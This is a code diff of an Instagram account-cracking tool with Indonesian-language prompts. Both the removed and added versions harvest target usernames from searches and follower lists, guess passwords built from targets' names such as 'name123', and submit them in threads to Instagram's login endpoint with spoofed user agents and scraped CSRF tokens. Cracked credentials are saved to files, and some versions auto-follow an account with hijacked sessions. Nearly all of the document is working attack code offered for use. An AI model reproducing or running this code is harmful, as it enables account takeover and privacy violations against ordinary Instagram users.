-		try:
-			aa='Mozilla/5.0 (Linux; Android '
-			b=random.choice(['4','5','6','7','8','9','10','11','12'])
-			c='SAMSUNG GT-'
-			d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-			e=random.randrange(1, 999)
-			f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-			g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-			h=random.randrange(73,100)
-			i='0'
-			j=random.randrange(4200,4900)
-			k=random.randrange(40,150)
-			l='Mobile Safari/537.36'
-			uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-			token=s.get("https://www.instagram.com/",headers={"user-agent":uaku}).content
-			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
-			s.headers.update({
-				'authority': 'www.instagram.com',
-				'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
-				'x-instagram-ajax': '82a581bb9399',
-				'content-type': 'application/x-www-form-urlencoded',
-				'accept': '*/*',
-				'user-agent': uaku,
-				'x-requested-with': 'XMLHttpRequest',
-				'x-csrftoken': crf_token,
-				'x-ig-app-id': '936619743392459',
-				'origin': 'https://www.instagram.com',
-				'sec-fetch-site': 'same-origin',
-				'sec-fetch-mode': 'cors',
-				'sec-fetch-dest': 'empty',
-				'referer': 'https://www.instagram.com/',
-				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
-			})
-
-			param={
-				"username": user,
-				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
-				"optIntoOneTap": False,
-				"queryParams": {},
-				"stopDeletionNonce": "",
-				"trustedDeviceRecords": {}
-			}
-			x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
-			x_jason=json.loads(x.text)
-			if "userId" in x.text:
-				nama,pengikut,mengikut,postingan=self.APIinfo(user)
-				io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
-				oi = nel(io, style='')
-				print('\n')
-				cetak(nel(oi, title='LIVE'))
-
-			elif 'checkpoint_url' in x.text:
-				nama,pengikut,mengikut,postingan=self.APIinfo(user)
-				io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
-				oi = nel(io, style='yellow')
-				print('\n')
-				cetak(nel(oi, title='CHECKPOINT'))
-
-			elif 'Please wait a few minutes' in str(x.text):
-				sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
-				self.checkAPI(user,pw)
-		except:
-			self.checkAPI(user,pw)
-
-	def menu(self):
-		self.logo()
-		c=input(f' {C}[PILIH]{C} :  ')
-		if c=='':
-			self.menu()
-		elif c in ('1','01'):
-			mas='# Masukan jumlah target'
-			mas1=mark(mas,style='blue')
-			sol().print(mas1)
-			m=int(input(f'\n{C}[•] Jumlah : {C}'));print('')
-			mas='# Masukan nama random untuk di searching'
-			mas1=mark(mas,style='blue')
-			sol().print(mas1)
-			for i in range(m):
-				i+1
-				nama=input(f'{C}[•] Masukan nama {H}({C}{len(internal)}{C}):{N} ')
-				name=self.searchAPI(self.cookie,nama)
-			self.passwordAPI(name)
-
-		elif c in ('2','02'):
-			menudump.append('pengikut')
-			mas='# Target harus bersifat publik jangan privat'
-			mas1=mark(mas,style='red')
-			sol().print(mas1)
-			m=input(f'{C}[•] Username target : {C}')
-
-			id=self.idAPI(self.cookie,m)
-			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100',id)
-			self.passwordAPI(info)
-
-		elif c in ('3','03'):
-			mas='# Target harus bersifat publik jangan privat'
-			mas1=mark(mas,style='red')
-			sol().print(mas1)
-			m=input(f'{CY}[•] Username target : {C}')
-
-			id=self.idAPI(self.cookie,m)
-			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
-			self.passwordAPI(info)
+### DUMP QUERY ###
 
 
-		elif c in ('4','04'):
-			print('')
-			for i in os.listdir('result'):
-				print(f' {U}[{U}+{C}] {i}')
-			c=input(f'\n {N}{C}[•] Masukan nama file :  {C}')
-			g=open("result/%s"%(c)).read().splitlines()
-			print(f'\n{C}[+] Total Result {H}{len(g)}{C}')
-			print(f'\n{C}[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
-			for s in g:
-				usr=s.split("|")[0]
-				pwd=s.split("|")[1]
-				self.checkAPI(usr,pwd)
-			exit(f'\n\n{K}[#] proses check selesai...{C}')
+def hastag(cookie, nama, limit):
+    url = "https://www.instagram.com/web/search/tags/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(
+        limit, nama)
+    with requests.Session() as ses_dev:
+        res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
+        for dev in json.loads(res_dat_pencarian.content)["users"]:
+            username = dev["username"]
+            nama = dev["full_name"].encode("utf-8")
+            if len(status_foll) != 1:
+                #print("\r [*] mengambil user : %s%s%s"%(H,len(data_),N)),
+                # sys.stdout.flush()
+                data_.append(username+"==>"+nama.decode("utf-8"))
+                c += 1
+            else:
+                data_followers.append(username)
 
-		elif c in ('5','05'):
-			print('')
-			for i in os.listdir('result'):
-				print(f' [{U}>{C}] {i}')
-			c=input(f'\n {U}[•] Masukan nama file: {C}')
-			g=open("result/%s"%(c)).read().splitlines()
-			xx=c.split("-")
-			xc=xx[0]
-			print(f'\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]')
-			for s in g:
-				usr=s.split("|")[0]
-				pwd=s.split("|")[1]
-				fol=s.split("|")[2]
-				ful=s.split("|")[3]
-				if xc=="checkpoint":
-					print(f"""
- [{M}+{C}] {M}CHECKPOINT LOGIN{C}:
-  {M}|{C}
-  {M}├╴>{C} Username: {O}{usr}{C}
-  {M}├╴>{C} Password: {O}{pwd}{C}
-  {M}├╴>{C} Followers: {O}{fol}{C}
-  {M}├╴>{C} Following: {O}{ful}{C}
-					""");sleep(0.05)
-				else:
-					print(f"""
-  {H}[>]{C}{H} STATUS :  LIVE {C}
-  {H}[>]{C}{H} Username : {H}{usr}{C}
-  {H}[>]{C}{H} Password : {H}{pwd}{C}
-  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
-  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
-					""");sleep(0.05)
-		elif c in ('6','06'):
-			global following
-			six=0
-			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
-			x=open('.kukis.log','r').read()
-			x_id=re.findall('sessionid=(\d+)',x)[0]
-			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
-			for i in following:
-				six+=1
-				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
-				six_id=self.sixAPI(i)
-				print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
-				self.unfollowAPI(six_id,'5452333948',self.cookie)
-				#print(w)
-			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
-
-		elif c in ('r','R'):
-			self.BUG()
-		elif c in ('c','C'):
-			self.ChangeLog()
-		elif c in ('e','E'):
-			self.Exit()
-
-		else:
-			self.menu()
-
-def tlisensi():
-	banner()
-	wel='# LICENSE IS NOT APPLICABLE OR WRONG'
-	wel2 = mark(wel, style='red')
-	sol().print(wel2)
-	time.sleep(2)
-	lisen=input('[•] Enter License : ')
-	open('.lisen.txt','w').write(lisen)
-	lisensi()
+### PW LIST ###
 
 
-def lisensi():
-	try:
-		cek=open('.lisen.txt').read()
-		lisensikuni.append(cek)
-	except:
-		tlisensi()
-	ses=requests.Session()
-	res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIxODM1ODY5NSIsImIwVVQyVmZGSUVlYlk4NUIxazIrV0hLclAyMG16UDVRaDI3K0NMejciXQ==&ProductId=15062&Key='+lisensikuni[0]).json()
-	status=res['licenseKey']['key']
-	if status ==cek:
-		banner()
-		wel='# LICENSE APPLICABLE '
-		wel2 = mark(wel, style='cyan')
-		sol().print(wel2)
-		time.sleep(2)
-		lisensiku.append("sukses")
-		login_kamu()
-	else:
-		tlisensi()
+def crack():
+    with ThreadPoolExecutor(max_workers=30) as insta_dev:
+        for dataku in data_:
+            try:
+                pw = []
+                data = dataku.encode("utf-8")
+                dat_ = data.split("==>")[0]
+                pw_ = data.split("==>")[1]
+                pw_nam = pw_.split()
 
-if __name__=='__main__':
-	try:
-		login_kamu()
-	except requests.exceptions.ConnectionError:
-		exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
+                if len(pencarian_) != 1:
+                    if len(dat_) >= 6:
+                        pw.append(dat_)
+                        if len(pw_nam[0]) <= 2:
+                            if len(pw_nam) >= 2:
+                                pw.append(pw_nam[0]+pw_nam[1])
+                            if len(pw_) >= 6:
+                                pw.append(pw_)
 
+                        else:
+                            pw.append(pw_nam[0]+"123")
+                            if len(pw_nam) >= 2:
+                                pw.append(pw_nam[0]+pw_nam[1])
+                            if len(pw_) >= 6:
+                                pw.append(pw_)
+
+                    else:
+                        # pw.append(dat_+dat_)
+                        if len(pw_nam[0]) <= 2:
+                            if len(pw_nam) >= 2:
+                                pw.append(pw_nam[0]+pw_nam[1])
+                            if len(pw_) >= 6:
+                                pw.append(pw_)
+
+                        else:
+                            if len(pw_nam) >= 2:
+                                pw.append(pw_nam[0]+pw_nam[1])
+                            pw.append(pw_nam[0]+"123")
+                            if len(pw_) >= 6:
+                                pw.append(pw_)
+                else:
+                    pw.append(pw_nam[0]+"123")
+                    pw.append(dat_)
+
+                insta_dev.submit(crack_dev, dat_, pw)
+            except:
+                pass
+
+
+None
+
+### CRACK ###
+count_ = 1
+
+
+def crack_dev(username_dev, pass_dev_):
+    global c, count_
+    c_pw = len(pass_dev_)
+
+    for pass_satu in pass_dev_:
+        if c != 1:
+            pass
+        else:
+            if len(status_foll) != 1:
+                print("\r {}[*] [crack] {}/{} OK-:{} - CP-:{}".format(N,
+                      str(count_), len(data_), len(hasil_ok), len(hasil_cp))),
+                sys.stdout.flush()
+                c_pw -= 1
+            else:
+                pass
+
+        try:
+            if username_dev in hasil_ok or username_dev in hasil_cp:
+                break
+            pass_dev = pass_satu.lower()
+            try:
+                headerz = {"User-Agent": user_agentz_api}
+                with requests.Session() as dev:
+                    url_scrap = "https://www.instagram.com/"
+                    data = dev.get(url_scrap, headers=headerz).content
+                    crf_token = re.findall(
+                        '{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
+                header = {"Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.5", "Host": "www.instagram.com",
+                          "X-CSRFToken": crf_token, "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/accounts/login/", "User-Agent": user_agentz, }
+                param = {"username": username_dev, "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(
+                    1000000000, 99999999999), pass_dev), "optIntoOneTap": False, "queryParams": {}, "stopDeletionNonce": "", "trustedDeviceRecords": {}}
+            except:
+                header = {}
+                param = {}
+                pass
+
+            with requests.Session() as ses_dev:
+                url = "https://www.instagram.com/accounts/login/ajax/"
+                respon = ses_dev.post(url, data=param, headers=header)
+                data_dev = json.loads(respon.content)
+                time.sleep(00.1)
+                if "checkpoint_url" in str(data_dev):
+                    cp = "Checkpoint"
+                    info_dev(username_dev, pass_dev, cp)
+                    with open("cp.txt", "a")as dev_:
+                        dev_.write(" [Chek] "+username_dev+"|"+pass_dev+"\n")
+                    hasil_cp.append(username_dev)
+                    break
+                elif "userId" in str(data_dev):
+                    live = "Live"
+                    if len(status_foll) != 1:
+                        info_dev(username_dev, pass_dev, live)
+                        with open("ok.txt", "a")as dev_:
+                            dev_.write(" [Live] "+username_dev +
+                                       "|"+pass_dev+"\n")
+                        hasil_ok.append(username_dev)
+                        follow_dev(ses_dev, username_dev)
+                    else:
+                        hasil_ok.append("dev_id")
+                        follow_dev(ses_dev, username_dev)
+                    break
+                elif "Please wait" in str(data_dev):
+                    print(
+                        "\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik" % (M)),
+                    c += 1
+                    sys.stdout.flush()
+                    pass_dev_iq = [pass_dev]
+                    crack_dev(username_dev, pass_dev_iq)
+                    count_ -= 1
+                else:
+                    c = 1
+                    pass
+        except requests.exceptions.ConnectionError:
+            print("\r %s[!] anda tidak terhubung ke internet" % (M)),
+            sys.stdout.flush()
+            c += 1
+            pass_dev_iq = [pass_dev]
+            crack_dev(username_dev, pass_dev_iq)
+            count_ -= 1
+        except:
+            c = 1
+            pass
+
+    count_ += 1
+
+
+None
+
+
+def info_dev(username_dev, pass_dev, status):
+    try:
+        global id_, pengikut, mengikuti
+        da = requests.get("https://www.instagram.com/{}/?__a=1".format(
+            username_dev), headers={"User-Agent": user_agentz})
+        data_us_dev = da.json()["graphql"]["user"]
+        nama = data_us_dev["full_name"].encode("utf-8")
+        id_ = data_us_dev["id"]
+        pengikut = data_us_dev["edge_followed_by"]["count"]
+        mengikuti = data_us_dev["edge_follow"]["count"]
+        if status == "Live":
+            print"\r "+N+"[✓] Status   : "+H+status + "                 "
+            print"\r "+N+"[✓] Nama     : "+H + str(nama) + "              "
+            print"\r "+N+"[✓] pengikut : "+H + str(pengikut) + "              "
+            print"\r "+N+"[✓] mengikuti: "+H + str(mengikuti) + "              "
+            print"\r "+N+"[✓] Username : "+H + username_dev + "              "
+            print"\r "+N+"[✓] Password : "+H + pass_dev + "             \n"
+        elif status == "Checkpoint":
+            print"\r "+N+"[✓] Status   : "+K+status + "                 "
+            print"\r "+N+"[✓] Nama     : "+K + str(nama) + "              "
+            print"\r "+N+"[✓] pengikut : "+K + str(pengikut) + "              "
+            print"\r "+N+"[✓] mengikuti: "+K + str(mengikuti) + "              "
+            print"\r "+N+"[✓] Username : "+K + username_dev + "              "
+            print"\r "+N+"[✓] Password : "+K + pass_dev + "             \n"
+        else:
+            pass
+    except:
+        pass
+
+
+None
+
+if __name__ == "__main__":
+    cek_login()
+    menu_dev()
